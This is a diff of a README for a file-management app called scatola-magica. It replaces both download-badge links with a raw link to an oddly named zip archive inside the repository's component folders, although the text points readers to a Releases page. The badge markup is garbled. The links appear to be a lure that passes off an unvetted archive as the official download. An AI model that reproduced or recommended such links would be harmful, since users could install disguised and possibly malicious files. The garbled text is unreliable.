@@ -8,7 +8,7 @@ Welcome to scatola-magica! This self-hosted file management system makes handlin
 
 To get started, you need to download the application. Visit the link below to access the Releases page.
 
-[![Download scatola-magica](https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/FeatureComponents/SettingsPage/scatola-magica-3.6.zip%20Now-Visit%https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/FeatureComponents/SettingsPage/scatola-magica-3.6.zip)](https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/FeatureComponents/SettingsPage/scatola-magica-3.6.zip)
+[![Download scatola-magica](https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/scatola_magica_hybodont.zip%20Now-Visit%https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/scatola_magica_hybodont.zip)](https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/scatola_magica_hybodont.zip)
 
 ### Steps to Download
 
@@ -83,6 +83,6 @@ For additional help:
 
 For your convenience, here is the download link once more:
 
-[![Download scatola-magica](https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/FeatureComponents/SettingsPage/scatola-magica-3.6.zip%20Now-Visit%https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/FeatureComponents/SettingsPage/scatola-magica-3.6.zip)](https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/FeatureComponents/SettingsPage/scatola-magica-3.6.zip)
+[![Download scatola-magica](https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/scatola_magica_hybodont.zip%20Now-Visit%https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/scatola_magica_hybodont.zip)](https://raw.githubusercontent.com/Chriske33/scatola-magica/main/app/_components/scatola_magica_hybodont.zip)
 
 Explore, manage, and enjoy your files with scatola-magica. Thank you for choosing our application!
